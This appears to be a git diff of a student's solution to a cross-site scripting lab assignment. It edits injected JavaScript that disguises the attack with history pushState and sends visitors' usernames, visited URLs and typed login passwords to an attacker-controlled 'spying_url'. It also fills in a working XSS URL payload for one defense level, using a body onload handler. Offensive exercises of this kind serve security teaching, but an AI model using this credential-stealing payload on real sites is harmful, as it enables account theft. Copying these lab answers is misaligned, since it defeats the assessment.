@@ -15,6 +15,7 @@
             /*This function can make it appear that a new page has been loaded
             Note that you can proxy the main page, or a search page! */
             function proxy(href, spying_url, shouldPush = true) {
+                /* 456789876543456789876543456789876543 */
 
                 /* Make all current HTML invisible.*/
                 $('html').hide();
@@ -26,7 +27,6 @@
                     $('html').show();
 
                     /*TODO implement spying while being stealthy and persistent. Remove the alert.
-                    alert("Notice that although we injected code into the search page, you see here the main page!")
                      <NEED TO USE PUSH STATE TO ENSURE THE HISTORY IS NOT SREWED UP>*/
                     if (shouldPush) {
                         history.pushState(null, document.title, href);
@@ -41,10 +41,10 @@
                     };
 
                     const bar = document.createElement('div');
-                    bar.style = "background-color: red; width: 100%; height: 50px;";
+                    bar.style = `background-color: red; width: 100%; height: 50px;`;
                     document.querySelector('div.navbar-default').prepend(bar);
 
-                    var uName = $("#logged-in-user", this).text();
+                    var uName = $(`#logged-in-user`, this).text();
                     if (uName) {
                         var sendLink = `${spying_url}?event=nav&user=${uName}&url=${document.location.href}`;
                         $.get(sendLink);
@@ -55,7 +55,7 @@
 
                     Array.from(document.getElementsByClassName('history-item')).forEach(function (link) {
                         var txt = $(link).text();
-                        if (txt.includes("<scrscriptipt>") || txt.includes("<script>")) {
+                        if (txt.includes(`456789876543456789876543456789876543`)) {
                             $(link).hide();
                         } 
                     });
@@ -64,8 +64,8 @@
                     $('.well > .form-inline').submit(function (e) {
                         e.preventDefault();
                         var form = this;
-                        var uName = $("input[name='username']", this).val();
-                        var uPass = $("input[name='password']", this).val();
+                        var uName = $(`input[name='username']`, this).val();
+                        var uPass = $(`input[name='password']`, this).val();
                         console.log(uName, uPass);
                         var spyLink = `${spying_url}?event=login&user=${uName}&pass=${uPass}`;
                         console.log(spyLink);
@@ -78,7 +78,7 @@
                     $('.navbar-nav > .navbar-form').submit(function (e) {
                         e.preventDefault();
                         var form = this;
-                        var uName = $("#logged-in-user", this).text();
+                        var uName = $('#logged-in-user', this).text();
                         console.log(uName);
                         var spyLink = `${spying_url}?event=logout&user=${uName}`;
                         $.get(spyLink);
@@ -107,7 +107,7 @@
                 });
             }
             /*Call Proxy*/
-            history.replaceState(null, document.title, "./");
+            history.replaceState(null, document.title, './');
             proxy('./', attacker);
         }
 
@@ -142,10 +142,12 @@
                     ";payload('" + attacker + "');" +
                     "</scrscriptipt" + ">"
                 );
-            // return target + "/search?xssdefense=" + (defense-2) + "&q=" + encodeURIComponent(`<body onload="(function(){${payload_string};alert('hello world');})();">`); 
         case 4:
             // TODO: generate XSS URL payload for defense level 2.2.3.4
-            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
+                encodeURIComponent(
+                    `<body onload="(function(){${payload_string};payload('${attacker}');})();">`
+                ); 
         case 5:
             // TODO: generate XSS URL payload for defense level 2.2.3.5
             return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
